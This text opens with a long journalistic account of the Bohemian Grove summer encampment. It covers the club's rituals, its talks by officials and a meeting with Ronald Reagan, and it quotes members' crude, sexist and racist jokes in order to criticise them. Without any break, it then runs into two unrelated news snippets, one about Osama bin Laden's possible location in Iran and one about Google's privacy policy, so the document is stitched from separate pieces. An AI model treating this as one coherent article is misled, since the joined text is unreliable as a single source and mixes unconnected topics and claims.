Then the beer brewer himself came out to sing : " Mandalay , " the song based on the Kipling poem .
He was a goateed giant with massive shoulders and a beer gut .
Rudyard Kipling , romantic colonialist and exponent of the masculine spirit , is , naturally , one of the Grove 's heroes , and " Mandalay " is a triumphant white man 's - burden song .
The brewer finished tearily , his arms high above his head , fists clenched , " Take me back to Mandalay - ah . "
Amid wild applause one man removed a heavily chewed cigar to say , " If that do n't send a chill up your spine , you ai n't a Bohemian . "
His friend , a man in a yellow brocade vest , agreed .
" He really put the balls into it . "
" Yep , Big Daddy 's in town . "
* * *
One reason for the Bohemian Club 's poor public relations is the name it gave to the yearly opening ceremony : The Cremation of Care .
The cremation is intended to put the busy men of the club at ease and banish the stress of the outside world , but it arouses critics of the encampment because they interpret it to mean that Bohemians literally do n't care about the outside world .
Cremation of Care , they fear , means the death of caring .
Demonstrations outside the Grove a few years back often centered around the " Resurrection of Care . "
The cremation took place at the man -made lake that is the center of a lot of Grove social activity .
At 9:15 p.m. a procession of priests carrying the crypt of Mr. Dull Care came out of the trees on the east side , along the Grove 's chief thoroughfare , River Road .
They wore bright red , blue and orange hooded robes chat might have been designed for the Ku Klux Klan by Marimekko .
When they reached the water , they extinguished their torches .
At this point some hamadryads ( tree spirits ) and another priest or two appeared at the base of the main owl shrine , a 40 - foot - tall , moss - covered statue of stone and steel at the south end of the lake , and sang songs about Care .
They told of how a man 's heart is divided between " reality " and " fantasy , " how it is necessary to escape to another world of fellowship among men .
Vaguely homosexual undertones suffused this spectacle , as they do much of ritualized life in the Grove .
The main priest wore a pink - and - green satin costume , while a hamadryad appeared before a redwood in a gold spangled bodysuit dripping with rhinestones .
They spoke of " fairy unguents " that would free men to pursue warm fellowship , and I was reminded of something Herman Wouk wrote about the Grove : " Men can decently love each other ; they always have , bur women never quite understand . "
Then the crypt of Care was poled slowly down the lake by a black - robed figure in a black gondola , accompanied by a great deal of special effects smoke .
Just as the priests set out to torch the crypt , a red light appeared high in a redwood and large speakers in the forest amplified the cackling voice of Care : " Fools !
When will ye learn that me ye cannot slay ?
Year after year ye burn me in this Grove ....
But when again ye turn your feet toward the marketplace , am I not waiting for you , as of old ? "
With that , Care spat upon the fires , extinguishing them .
The priests turned in desperation to the owl .
" Oh thou , great symbol of all mortal wisdom , Owl of Bohemia ... grant us thy counsel ! "
Every year there are new wrinkles on the cremation ceremony .
The big improvement this year was to project a sort of hologram onto the owl 's face so that its beak seemed to move .
Also , it was Walter Cronkite talking .
( Cronkite camps in Hill Billies along with George H.W. Bush , William F. Buckley Jr. and former astronaut and ex-Eastern Air Lines chairman Frank Borman . )
Cronkite , as the owl , said that the only way Care could be cremated was to use fire from the Lamp of Fellowship before him , an " eternal " gas flame that burns day and night while the encampment is on .
That did it .
Care went up in blazes .
Around me the men exploded in huzzahs .
Fireworks went off at the lakeside , and a brass band in peppermint - striped jackets and straw boaters came out of the woods playing " There 'll Be a Hot Time in the Old Town Tonight . "
The sudden appearance of men in striped jackets shows what a bouillabaisse of traditions the Grove is .
Bohemian Club literature is pious on this score .
It boasts that the Cremation of Care ceremony derives from Druid rites , medieval Christian liturgy , the Book of Common Prayer , Shakespearean drama and nineteenth - century American lodge rites .
Early Bohemians were hungry for exaltation and grabbed on to any tradition they could find to dignify their exile in the vulgar West .
The club was founded in 1872 , just three years after the transcontinental railroad was completed , by a group of newspapermen and artists who plainly felt social anxiety about their surroundings .
Early club menus offered dolled - up western dishes such as " boiled striped bass au vin blanc " and " cafe noir . "
The club's " men of talent " ( i.e. , artists and writers ) included writers of a populist bent : Mark Twain , Bret Harte , Henry M. Stanley .
Bohemian Jack London was a socialist ; Bohemian Henry George , a radical reformer .
But the club 's newspapermen were also socially ambitious , aiming to chronicle California 's rise in the arts and sciences .
Bohemian , they agreed in their early annals , did n't mean an unwashed shirt and poetry ; it signified London , the beau monde , men of eminence whose purses were always open to their friends .
By such standards , San Francisco businessmen surely looked crude .
Just the same , the club needed such " men of use " to support their activities .
The Bohemian Club 's waiting list , which had first appeared away back in the 1920s , grew to ridiculous lengths .
I was told that if a Californian is not admitted before he is 30 , he can despair of membership unless he achieves commercial or political prominence .
Many older men die waiting .
And membership comes dear .
The initiation fee for regular voting membership is said to be $ 8,500 , and dues are set at more than $ 2,000 a year .
Because the regular members require entertainment , " men of talent " pay greatly reduced fees .
On Wouk 's acceptance , for instance , he was put to work writing a history of the club .
The encampment became controversial in the early Reagan years when reporters , still suffering the hangover of Carter populism , questioned club executive appointees about the club 's sexist practices .
The Grove 's keenest adversary is Mary Moore , who lives in a counter cultural shantytown in nearby Occidental .
Moore was the 1953 San Luis Obispo County Fiesta queen , but by 1980 she had become , she says , a " woman - identified woman , " and the Grove 's thunderous maleness and what she calls its " closedness " disturbed her .
Of course , just about anybody could hate the Grove .
With its dense concentration of extravagant war - and money - mongers , it 's an easy object of protest , and 72 left - wing groups eventually joined Moore to form the Bohemian Grove Action Network .
For a while , in the early 1980s , Moore and BGAN thought they might actually liberate the redwoods .
In 1984 folk singing demonstrators tried to quarantine the Bohemians inside the Grove because they were so dangerous to the outside world .
Fifty people were arrested .
Summer after summer BGAN stoked Grove conspiracy theories by getting hold of the guest list .
In 1981 , for instance , Dan Rostenkowski , Ed Meese and former president of CBS News Van Gordon Sauter attended ( Sauter as the guest of former California governor Edmund " Pat " Brown , Jerry 's father ) .
Meese , by the way , is about the only major Reaganite who did n't end up as a member .
In its obsession with the encampment , BGAN has unwittingly taken on Bohemian traits , becoming a kooky mirror image of the Grove .
It wove spidery webs of string across Bohemian Avenue to block the way in .
It urged its followers to form " Boho Clubs " to study members so they could be " held accountable by the American People " for participating " in the maintenance of the process of plutocratic patriarchy which threatens the planet Earth with omnicide from the nuclear menace . "
When BGAN resurrected Care , it chanted its own hymns : " On a day much like this five score years ago , the first hideous fire was lit in Monte Rio , and sweet Care was banished from this lovely land , and Bohemians reveled upon their shifting sand . "
But by 1985 BGAN 's energies were ebbing .
The media 's anti-elitist mood , never all that ferocious , was spent .
The reporters that Mary Moore had helped spirit into the Grove for hours at a time had come out with vague , watered - down versions of what went on , or their news organizations had suppressed the accounts .
By 1988 the gauntlet of hippies and solarheads and woman - identified women whom the Bohemians had been forced to maneuver their Jags and limos around to get to the gate had disappeared .
The Grove was still there .
When I got to Monte Rio , only a couple of signs of protest remained .
Moore 's answering machine message asking friends not to call her at her vintage - clothing store in the town of Sebastopol included a denunciation of the Cremation of Care .
And inside the Grove the guest list was well guarded .
It was posted in a locked glass case during the day , and was removed every night .
This was about the highest security I saw inside .
* * *
I 'm admitting for the first time in my life having no willpower , " a man was saying to his wife on one of the public phones .
He looked bewildered and hung over , and I figured Bohemians were warmly and mysteriously saying to him what they were saying to me : " I can tell this is your first Grove . "
It was just past noon on Sunday , the middle weekend at the encampment -- the busiest weekend , with attendance approaching 2,200 men .
The most dignified had arrived .
On the River Road you heard some small business talk .
" David Jr. 's going into the family business now . "
" He 's got a scruffy beard . "
" Yes , he looks radical , but he does n't talk like one . "
" Abby , now , she 's the one who raised her fist at graduation ?
Had a red fist painted on the back of her gown . "
Of course .
The Rockefellers .
" Where was that ?
Radcliff ? "
" You know , they 've got a lot of liberal faculty . "
" They 're always an the periphery of radicalism . "
" My son was in Santiago , and David sent him letters of introduction to seven leading bankers in seven countries . "
At lakeside the grass was crowded for the day 's talk .
Under the green parasol stood General John Chain , commander of the Strategic Air Command , who spoke of the country 's desperate need for the Stealth B - 2 bomber .
" I am a warrior and that is how I come to you today , " he said .
" I need the B - 2 . "
The important men come out for the Lakeside Talks , and each speaker seems to assume that his audience can actually do something about the issues raised , which , of course , it can .
On the first weekend , for instance , Associated Press president Louis Boccardi , addressing his listeners as men of " power and rank , " gave them more details than he said he was willing to give his readers about the plight of Terry Anderson , the Middle East correspondent held hostage since 1985 .
It was a transparent plea for help .
Other Lakeside speaking is more indulgent .
Here Nicholas Brady examined the history of the Jockey Club .
Here William Buckley described how he had sat at his desk and cried upon learning of Whittaker Chambers 's death .
Here Henry Kissinger made a bathroom pun on the name of his friend Lee Kuan Yew , who was in attendance -- the sort of joke that the people of Singapore , whom Lee rules with such authoritarian zeal , are not free to make in public .
The speeches are presented as off - the - record -- one of the absurdities of Grove life , given that they are open to several thousand people .
As the Soviet Sagdeyev said in his speech , " There is no glasnost here . "
After General Chain 's talk , the usual quiet business chatter went on .
" Your secretary , I got to tell you , she 's 110 percent , " a dark - haired man said to an older fellow .
Three other men discussed a friend of theirs who had left early that morning for New York .
One of them seemed puzzled -- the friend was n't the sort to get going at 7:45 a.m. , he noted .
" It was a free ride , " the other friend explained .
" Bill Simon had room on his plane . "
" Simon does n't know he does n't have money . "
They all got a big kick out of this .
Simon was Treasury secretary in the Ford administration and today is a major savings and loan conglomerateur , active in takeovers .
It would seem that this year 's encampment was useful to him .
Two weeks later he plunged into Sir James Goldsmith 's battle to take over B.A.T.
Industries PLC of England , a deal that could give Simon a toehold in Europe .
He was surely influenced by Prime Minister Rocard 's Saturday afternoon Lakeside Talk , in which he dangled the most sanguine business expectations of the new European order .
In 1982 reporters followed German chancellor Helmut Schmidt co the Grove gates , and the front page of the Christian Science Monitor termed the Grove " the West 's hidden summit . "
This year Rocard 's visit went unreported .
A week after the encampment , a Washington correspondent for a French paper insisted to me that the last time the prime minister had visited the U.S. was a year and a half ago .
" One of the contemporary myths about the Bohemian Club is that it is a gathering and decision - making place for national and international ' power brokers , " ' the club 's then - president said in 1980 .
In fact , the encampment has always had political significance .
Richard Nixon , Barry Goldwater and Nelson Rockefeller all stopped in as they geared up for their respective presidential campaigns .
Politicians say there is no place like the Grove to help get a campaign rolling .
No wonder this year 's guest list included the two biggest congressional bagmen of recent years : Representative Tony Coelho , former chairman of the House Democratic Campaign Committee , and Representative Guy Vanderjagt , his counterpart on the Republican committee .
These men were interested in something more than pseudo - Druidic rituals .
The club says it serves as a " refuge " from the strivings of the marketplace , and though it 's true that actual deal - making is discouraged , I heard business being done on all sides .
The pay phones were a hub of activity .
" Owner slash developer , " a man dictated to his secretary one morning .
On the blackboard near the bootblack stand there were phone messages for corporate raider Henry Kravis and Bloomingdale 's chairman Marvin Traub .
That day as I sat writing a letter ( actually my notes ) at the Civic Center , a one - story building in which various amenities ( Grove stationery , laundry facilities ) are available to Bohemians , I overheard a large fellow in cranberry - colored shorts on the phone , bragging to someone back at the office .
" I got slightly inebriated -- slightly ! --
I mean heavily inebriated with the president of the Portland Opera last night .
I said we might have a deal for him .
They 're going to have Pavarotti there in November .
I said when we got back we 'd talk about it . "
It was in the phone circle that Henry Kissinger alienated some brother Bohemians on the middle weekend .
Wandering into the clearing , he announced to the air , " I have to make two phone calls . "
A man finished his call , and Kissinger , ignoring a half - dozen men in line , took the booth and proceeded to retell to a woman , evidently his wife , the Russian speaker 's joke about the KGB 's interrogation of a CIA agent .
( The CIA agent denies involvement first in a calamitous ship disaster , then in Chernobyl . "
So what are you responsible for , " the KGB asks him .
" Your agricultural policy . " )
The woman on the line evidently objected to the joke , for Kissinger said , revealing a dovish streak , " Maybe the KGB did write it , but it is not a sign of strength . "
Kissinger 's crusty performance was not appreciated by the men he 'd cut in front of in line .
One Bohemian , a patrician fellow with silver hair , wheeled in rage , saying , " I 'll be goddamned . "
Cutting in line is distinctly un-Bohemian behavior .
Everywhere you hear what is Bohemian and what is n't Bohemian , One night I wandered into Fore Peak camp and got a lecture from a man named Hugh about Bohemian values as they concerned Fore Peak 's famous drink , a mixture of rum and hot chocolate .
Many years ago a doctor called it a Nembutal , and the name stuck , so much so that one Fore Peak camper wears a stethoscope and a white lab coat with Dr. Nembutal stitched on it .
Hugh said that an old college friend came to stay in Bohemia and took over the mixing of the drinks .
He persisted in putting in too much rum to see how many guys would pass out .
" Hey , knock it off , this is Bohemia , " Hugh had to tell him .
He never invited the chum back .
A tenet of Grove life is noncompetitive egalitarianism : all men are equal here .
But in fact , class and status differences among camps are pronounced .
Just as you have to be sponsored for membership , you have to be sponsored for a camp .
The screens get pretty fine .
Nonetheless , the ideal of equality is comforting .
Among other things , it permits alcoholic failures to feel equal for a few days with their workaholic cousins .
Since everyone is supposed to kick back and forget work , it 's the fuck - up 's annual revenge .
At Sundodgers camp there is a motto on the mantel :
The productive drunk is the bane of all moralists .
It tells the productive they can drink , it tells the drunks they 're productive .
* * *
A high point of the middle weekend was the performance of The Low Jinks , the Grove 's elaborate musical - comedy show .
Over the years the Jinks has become the leading entertainment at the encampment , surpassing the mannered and ponderous Grove Play , which is performed the next weekend .
The Jinks is vigorously lowbrow .
It takes place on the Field Circle stage , which is wedged in between two camps , Pink Onion ( notable for its pink sheets ) and Cave Man ( notable for big - deal right - wingers and a plaque commemorating Herbert Hoover ) .
The Field Circle seats are steeply canted ; sitting in one feels like being inside a megaphone .
The mood was American and bellicose .
For a good half hour the band warmed up the audience , playing the fight songs of many California colleges and the armed services and culminating with " The Star - Spangled Banner . "
Individual melted into group , but what a group : George Shultz was seated below me , and word in the camp was that a year and $ 75,000 or so had been spent for a production that would be seen just once , just by them .
I felt like a member of the greatest nation ever , the greatest gender ever , the greatest generation ever .
At such times -- at many such times , among strong leaders , deep in the forest -- the Grove takes on a certain Germanic übermenschlich feeling .
This year 's Low Jinks was called Sculpture Culture , and the humor was not just lame but circa -1950s college follies lame .
Rex Greed , an effeminate gallery owner who sells toilets ( " a counterpoint of mass and void " ) , tries to convince artist Jason Jones Jr. that his future lies in sculptures composed of garbage .
When a character describes modern art as " the talentless being sold by the unprincipled to the bewildered , " the crowd 's roar seemed to contain the grief of hundreds of businessmen who have shelled out for headquarters art they do not understand .
The girls were all played by men , and every time they appeared -- their chunky legs and flashed buttocks highly visible through tight support hose -- the crowd went wild .
After one character called the secretaries in the show " heifers , " the audience could n't resist breaking into " moos " every time they came back onstage .
But the biggest crowd pleaser was Bubbles Boobenheim , a showgirl turned patroness who rubbed her prosthetic behind against the elevator doors at stage left .
The doors were used repeatedly for wrong - floor gags .
For example , at one point a Little League team came out that included Bohemians Bob Lurie and Peter O'Malley , the real - life owners of the San Francisco Giants and the Los Angeles Dodgers , in uniform .
When one character ; a PR executive , expressed a desire to make his mistress an honest woman , she objected , reminding him of an old Bohemian saying : " If it floats or flies or fools around , do n't buy it , rent it . "
The scene brought to mind the reputation for prostitution that hangs around the Grove .
From time to time law enforcement has tried unsuccessfully to bring cases against local procurers , and the Bohemian Grove Action Network circulates testimonials by a former paid mistress of a club member ( " I only saw him troubled by one thing , " she wrote .
" He bought some apple juice company for $ 1 million and he was fearful he would have to dip into his capital " ) .
One day in the Grove , I tipped a camp valet and he offered some unsolicited information .
Hookers came to a certain bar in Monte Rio at ten each night , he said .
It was the same bar - lodge - motel where the local police had arrested a man for pandering a few years back .
The bust came right after a Lakeside Talk by William Webster , then the FBI director , and the timing suggested it was his doing .
But the charges were dropped , and the man is remembered fondly in the Grove .
A Bohemian I overheard on the beach one day said that the man 's genius had been in keeping vacationing families in the motel ignorant of the other business going on there , " Now , that 's good management , " he declared , capturing the robust laissez faire spirit of the Grove .
The sexism and racism of the Jinks were of a peculiar sort .
Black jokes are out because there are a handful of black members -- though one day near the Civic Center I did hear a group of old - timers trying to imitate Jesse Jackson .
As for Jews , old membership lists suggest that they have taken a very small part in the club for decades .
That leaves women and Hispanics as targets for jokes -- such as the one about Bubbles 's protégé Raoul , who painted Puerto Rican flags on the backs of cockroaches .
The Jinks jokes about women were straight out of an old joke book .
" My father said if you have a choice between an angry woman and a rabid dog , take the dog , " Jason Jones Jr. said .
" It 's already got a fur coat and the license is a lot cheaper . "
And Rex Greed said , " The only difference between rape and rapture is salesmanship . "
The sensibility of the Grove recalls an era before the surgeon general 's report on smoking , before the death of God and duty , before the advent of cholesterol and Sandra Day O'Connor ( whose husband , John , bunks in Pelicans camp ) .
The mood is reminiscent of high school .
There 's no end to the pee-pee and penis jokes , suggesting that these men , advanced in so many other ways , were emotionally arrested sometime during adolescence .
The most striking prop in The Low Jinks was a sculpture of a female torso whose breasts and buttocks had both been attached to the front , an improvement that looked vaguely hostile .
And all the talk about male fellowship often sounds just like a college freshman 's version of No Gurls Allowed , an institutional escape from women , from their demands , aggressions and vapors .
At certain times of the year women are allowed to enter the Grove -- but only under " chaperonage , " according to a 1980 statement by the club president .
Chaperonage for adult women .
It 's another Bohemian wee - wee word , something you have n't heard since you were 14 .
The club 's nemesis here is the state of California , which keeps chipping away at the Grove 's maleness , lately threatening to take away its liquor license and its tax - exempt status because it discriminates against women .
The state has established a beachhead at the Grove 's front office , a hundred yards outside the main gate , where , under legal pressure , seven women have been employed .
Inside the Grove there is a feeling of mournful inevitability about the day women will join the encampment .
Bohemians talk about how much it will muddle things .
" It would screw everything up , excuse the pun , " said an old - timer sipping a drink by the river .
" There 'd be a lot more preening and peacocking than there already is , " a big gay Bohemian told me .
Members have cited their privilege to walk about in " various states of undress . "
And former California governor Pat Brown has said publicly , many times , that the presence of women would keep Bohemians from enjoying their hallowed freedom to pee .
The peeing is ceaseless and more than a little exhibitionistic .
Everyone talks about it .
Bohemian reminiscences describe such bizarre initiation rites as escorting new members to the redwood at which one of the founders " did his morning ablutions . "
The Owl Hoots , which are poster - size cartoons racked up each day near the Camp Fire Circle , are filled with pissing pictures .
One featured a spurious design for a commemorative stamp of club member U.S. Postmaster General Anthony Frank relieving himself on a redwood .
" Are you going to show it ? " I heard a 50 - ish Bohemian , the " captain " of Pow Wow camp , call out one day as young George went to pee off the deck .
" Most of it .
At least six inches . "
Came the reply : " Now , do n't be modest , George . "
A screen door creaked on a little house farther up the hill , and a Bohemian named Richard poked his head out , emerging from his siesta .
" Do it counterclockwise , Dickie , that 's best , " the captain called out .
" Oh , I 've had my hand off it for two minutes now , " Richard protested .
" There 's a lot of wasted time . "
This dick - fussing often manifests itself as that starkest of male nostalgias , the hankering for the punctual erections of boyhood .
According to 1979 figures , the average age of Bohemians is 55 .
Impotence is on many people 's minds .
The poster outside Monkey Block camp advertising this year 's Grove play , Pompeii , featured a gigantic erection under a toga .
The set for the play included a wall inscription in Latin meaning " Always hard . "
One day I was at the Grove beach when a Bohemian discovered that a friend 's sunscreen was supposed to impede aging .
" You got it too late . "
The owner of the lotion sighed .
" Well , I should give up putting it on my face and arms and spray it on my prick -- see if that 'll do any good . "
Bohemian discourse is full of oblique organ worship as well .
There 's all the redwood talk .
Bohemians rhapsodize endlessly about towering shafts and the inspiration they give men .
I love this tree as the most sound , upright and stately redwood in the grove .
Let my friends remember me by it when i am gone , reads a plaque left by a Bohemian at the base of a 301 - footer .
Other references are n't so subtle .
Late in the Low Jinks the elevator doors opened and a man came out wearing a rubber Henry Kissinger mask .
He had a dumpy body a lot like Kissinger's .
A " heifer " asked him why he was there .
The man peeled off the mask to reveal that he really was Kissinger , and he said in his familiar gravelly accent , " I am here because I have always been convinced that the Low Jinks is the ultimate aphrodisiac . "
( This joke is funny because Kissinger was famous for saying that " power is the ultimate aphrodisiac . " )
* * *
The encampment got even looser as the third and last weekend approached .
The fairy unguents were wearing off ; after two weeks the place stopped looking so magical and began to seem as ordinary as a tree - house .
The non-famous hard - core Bohemians were more in evidence now , men who wore owls in various forms -- owl belt buckles , brass owl bolo ties , denim shirts embroidered with owls .
Wooziness was pervasive .
At his Lakeside Talk , Malcolm Forbes said that Khrushchev knows the Soviets " are in over their heads , " and even as the name Gorbachev was murmured throughout the audience , Forbes rambled on , dotty and heedless , 25 years out - of - date .
At Faraway camp a guy beckoned me into the camp to enjoy " a little orange juice . "
It tasted like lighter fluid sprinkled with mint flakes .
" What 's in this ? "
Oh , just a little orange juice , " the host repeated , smiling .
" What do you call this ? " I asked another Farawayer .
" I call it dangerous , " he said and told of how a dropped cigar had once ignited a batch .
The men of Faraway had captured the rearranged - woman 's - torso sculpture from the Low Jinks and now displayed it against a wall , having wedged a fern leaf in " her " crack .
Meanwhile , the racked - up Owl Hoots drawings dubbed the sculpture the " statue of Piece " and pictured a Bohemian commenting that she would be " fun to dance with . "
Several of the Hoots jokes were at the expense of the homeless .
One cartoon had a camper at Bromley turning away a filthy guy with a bag of cans .
" This is for the campless , not the homeless , " he was saying .
The jokes fit right into the Grove 's Ayn Rand R&R mood .
" My grandmother always said , ' You can find sympathy in the dictionary , ' " a guy with a cigar said , walking on the River Road .
I 'd made it in that day for breakfast at the Dining Circle , the most lavish meal of the Bohemian day , an experience redolent of moneyed western ease .
The rough wooden tables were piled with perfect fruit .
As I sat down a great glistening arc of melon was slid before me .
Today they were offering Alaskan cod , sautéed lamb kidneys , eggs , French toast , bacon , sausages .
The encampment 's rules about dealing with waiters reinforce the heartless but egalitarian values of the Grove .
Tipping the help is strictly forbidden , but so is reprimanding them .
It 's easy to imagine that many early Bohemians started out as laborers and had to remind more aristocratic visitors that social mobility was a cherished ideal .
In the Grove 's Club Med - like plan , the meals are covered in the fee for the encampment , which , judging from schedules I 'd seen from two years back , ran about $ 850 on top of annual dues .
A waiter in a red jacket dropped an uneaten chunk of the bright red cod into a waste bin , and the Bohemians at my table talked about presidents .
It looked as though Richard Nixon would once again not show .
One old - timer said that Nixon was feuding with the board of directors .
He was waiting to be asked to give a Lakeside Talk , but the club was n't going to invite him until he had shown them the respect of visiting Cave Man camp for a weekend or so .
In my informant 's opinion , there was bad blood ; Nixon 's resignation 15 years ago had offended the club 's honor -- it had been so un-Bohemian .
The feud was unfortunate because Nixon and the club went back a long way .
In 1953 , when he was vice president , Nixon led a ceremony honoring Herbert Hoover 's 40th year as a Bohemian .
It took place at the Waldorf - Astoria , in a room piled with redwood bark and branches shipped to Manhattan from the Grove .
In 1971 , when the press corps forced him to cancel his speech at the Grove , President Nixon had wired the club to say , " Anyone can be president of the United States , but few have any hope of becoming president of the Bohemian Club . "
Meanwhile , the Bohemians ' new favorite son had arrived in camp the night before .
One of the waiters had heard whorehouse piano music coming from Owl 's Nest , and he said Ronald Reagan liked that kind of music .
Rumor had it that Reagan was going to give the next day 's Lakeside Talk .
Some said there were Secret Service men guarding the roads and the perimeter .
They 'd built special platforms in the trees for men with binoculars .
I did n't want to disagree .
On hikes I 'd taken , my impression had been that the only people patrolling the ten miles of Grove perimeter were a guy at the Guard House on Smith Creek Road who spent a lot of time whittling a walking stick and ancient Bohemians taking the daily 10:00 a.m. open - backed bus tour .
Rim rides , the tours were called .
Two of the buses bore vanity license plates commemorating the 1989 presidential inauguration -- they had the words Kinder and Gentler stamped on them .
In the afternoon I walked up Kitchen Hill Road to Owl 's Nest camp .
I wanted to visit the former president .
Owl 's Nest is sort of an old Hollywood - corporatist camp .
Eddie Albert is there , and United Technologies chieftain Harry J. Gray , who this year had brought along Union Carbide boss Robert D. Kennedy .
The camp has a false outer door and two overlapping walls that form an S - shaped entry .
Inside , a plump Secret Service guy in a Members
Only jacket sat near a giant wooden owl .
There were owl figures everywhere , notably a silver owl ice bucket on the bar whose head tilted off cleverly .
I walked over to the Secret Service guy and asked if it was okay to meet the president .
He said Reagan would love it and motioned with an open hand toward the deck .
Reagan was mixing it up with a bunch of old - timers a few feet away .
The first thing I noticed was that he had finally let his hair go gray .
Also , he 's not as tall as he looked in office .
He wore western gear all the way , a gray - blue checked western shirt , a white braided western belt , cowboy boots and , in his left breast pocket , an Owl 's Nest pin with an owl on it .
The getup stood out because it was so fastidious among men who had let themselves go .
We shook hands firmly ( his : small , bony ) and chatted .
Even one - on - one he has that habit of smiling and cocking his head and raising an eyebrow to encourage you .
He projects an automatic , almost druggy congeniality .
I worked hard to respond in kind ( I invented an infant son named Ronald Wilson Weiss ) .
We talked about his guest days at the Grove , before he became a member in 1975 ( two months after he left the California governorship , a week after George Shultz joined ) .
I asked him whether it was true that it was at the Grove in 1967 that he , then the new governor , had assured Nixon that he would n't challenge him outright for the Republican nomination in 1968 .
Reagan did n't get the question the first time around .
He pitched himself forward in his seat with a puzzled look , still trying to be genial .
I repeated myself , and he said , " Yes , yes , that 's true , " in the famous furry voice .
Then an old friend came up and snagged his attention .
By the time I got back into the central camp ground , they 'd announced the next day 's Lakeside Talk .
The mystery was over .
Comments by Ronald Wilson Reagan , said placards on the wooden signboards .
By the time the talk was over , the posters had all been lifted by souvenir - seeking Bohemians .
* * *
As dinner began that night , people were already sitting down on the redwood benches at the main stage for the Grove play ( despite the poster , a humorless enactment of the destruction of Pompeii ) .
Everything felt peaceful and sweet , like death , the good things they say about it : the end to striving , & sunlight - dappled heavenliness .
Music sounded softly .
A bagpiper walked in the woods by himself squeezing out a melancholy song , a brass band played " Sweet Georgia Brown " in Cliff Dwellers camp , and in Band Camp a young guitarist and an old pianist experimented with the Isley Brothers ' " It 's Your Thing . "
Nearby , a young member of the cast dressed as a woman pulled apart purplish gossamer robes to pee .
The popular redwoods between the Dining and Camp Fire Circles now reeked of urine and wore what looked to be a permanent skirt of wet , blackened soil .
For a while I thought the bar of salt bracketed on one tree by the lake was an experimental effort to neutralize uric acids before they hit the roots .
It turned out to be only a deer lick .
Down by the lake I saw three men lying on the ground , talking .
When they got up to go to dinner , one hugged another around the middle from behind and trudged up the bank with him that way , laughing .
" Honey , I lost my ring and I want to sell the house , " the third one said , mocking a homecoming speech .
At dinner I sat across from a young broker who shared his wine with me and complained about his girlfriend .
The meal ( tournedos of beef ) was festive and communal .
The long tables are lit by gas pipes that spring from the ears of wooden owl silhouettes three feet above the table , a half dozen of these per table .
Wine gets passed around ( though members must sign for the bottles on a chit ) .
Old friends move among the tables , kissing one another , and a ruddy Bohemian gets up on a bench and , as his friends cheer him on , removes his cap and opens his mouth to sing .
Great intimacy is achieved in song .
The physical aspect of Bohemian male bonding can't be overlooked .
Even 100 - year - old Grove annals have a homoerotic quality , with references to " slender , young Bohemians , clad in economical bathing suits . "
Nudity was more common then .
Today AIDS has put a damper on the Grove 's River Road pickup scene , which Herb Caen used to write about in his San Francisco Chronicle gossip column .
Just the same , a man on his own often gets invited back to camps by gay Bohemians .
The weirdest approach I experienced came from a tall redhead in western wear , a fourth - generation Californian .
He wandered up with a beer in his hand as I sat reading on a bench and , pausing for emphasis , pronounced , " In the beginning the Lord created -- cunts . "
* * *
When Ronald Reagan came to the green parasol the next day , the organ player broke into " California , Here I Come . "
Reagan said that it was good to be back .
The Grove had been a major factor in his " homesickness ... when you are forced to be away , as I was , for eight years . "
The speech was canned and courtly .
Though he cursed now and then , he seemed uncomfortable with the word damn , which he said almost sotto voce .
He did take a crack at toilet humor :
" You know , I got to take a second to do something naughty here , since this is an all - stag arrangement .
You know how many times we 've been in someone 's home , and we 've wanted to go to the powder room , and we 've maybe said , ' Excuse me , I 've got to powder my nose . '
Well , a man did that at a party , and his hostess said , when he came back , she said , ' You must have the longest nose in the world . '
He said , ' What are you talking about ? '
She said , ' Your fly 's open . ' "
Polite laughter .
The only surprises came when he took questions .
He got rousing applause when he called for greater regulation of the media .
" You know , the press conferences were adversarial bouts -- they were there to trap me in something or other . "
Reagan also came out in favor of four - year terms for congressmen .
" You know , " he said , for he started every comment with that phrase , " I have n't said this publicly before .
I would like to make the two - year congressman 's term four years , to reduce the number of elections that we have , because I think that 's one of the reasons that only about 53 percent of the people vote .
We 're just overdoing it .
There 's a kind of emotional experience with an election year , that between state elections , local elections , and besides , with a two year term , a congressman gets elected and the next day he starts campaigning for the next election . "
I wanted to ask Reagan about efforts to desegregate the club .
It 's only a matter of time before the club gets sued under either California 's civil rights act or San Francisco 's civil rights ordinance , both of which bar sex discrimination in business establishments .
The Bohemians will be hard - pressed to prove that they are a purely private club that falls outside the legal definition of a business , when clearly so many members participate for business - related reasons .
Some day the walls will fall , though it's hard to see why any woman would want to join a crowd of old Republicans chewing cigars and reminiscing about potency .
I wrote " How do you feel about government and legal efforts to force the Club to admit women ? " on a piece of Grove stationery and went up to the fellow taking questions from my section , by the giant owl .
It was a risk , but then it was my last hour of my first and last Grove .
My bags were packed -- a camera in one pocket , a tape recorder in the other .
Also , I 'd tried to grab one of the free Bohemian Club walking sticks from the museum , something I could lean against my office wall with the B/C shield turned out to remind myself that this right - wing fantasia had not been just a dream .
But there were none left ; Bohemians had taken them all hiking .
The moderator studied the page and asked who I was and what camp I was in .
We were a few feet from the Lamp of Fellowship , and after looking me over he said he did n't know , this was pushing it .
He did n't ask Reagan my question , of course .
The rest of the questions were about the world outside the Grove .
Then the organist struck up " America the Beautiful " and Reagan left in a red truck , waving .
Later I heard a Bohemian on the River Road saying it had been brave of Reagan to take on all comers , But another Bohemian pointed out it really had n't been a big risk .
" Who was going to offend the president ? "
After all , this was Bohemia .

Terror mastermind Osama bin Laden is in eastern Iran and not the rugged tribal areas of Pakistan 's northwestern frontier where many believe him to be on the run , United States intelligence officials were on Monday quoted as saying .
In interviews to the Washington Times , the US officials said the Iran theory , which is held by a minority , is based on bits of intelligence information and the fact that months of Central Intelligence Agency operations , along with search - and - destroy sweeps by thousands of Pakistani troops have failed to find the Al Qaeda chief or his number two Ayman al - Zawahiri .
Asked whether the US intelligence community thinks Osama may be in Iran , a senior administration official told the paper , " Some people think he is . "
That source said there is great frustration , especially within the inner circle around Defence Secretary Donald Rumsfeld , that Osama has not been caught or even unequivocally spotted in Pakistan 's border region , which in turn fuels speculation that he may not be there at all .
Republican Congressman Curt Weldon , House Armed Services Committee member , writes in his new book , Countdown to Terror that a reliable Iranian source he identifies only as ' Ali ' told him that Osama has been in Iran for some time .
" The course of world events , " Weldon writes , " have established incontrovertibly that Ali is a high credible source of reliable intelligence on Iran and other terrorist activities . "
The Bush administration 's official position is that Osama is most likely in the border region straddling Pakistan and Afghanistan and that he is hidden by tribal allies .
" The consensus is that Osama remains in the border region , " said a US intelligence official .

Google 's online influence worries some privacy campaigners
Peter Fleischer said the company " could do better " with policy statements that explained why user information was sometimes shared with third parties .
Mr Fleischer said Google would never give " identifiable personal data " to third parties , including advertisers .
Google 's privacy policy has come under scrutiny in recent weeks .
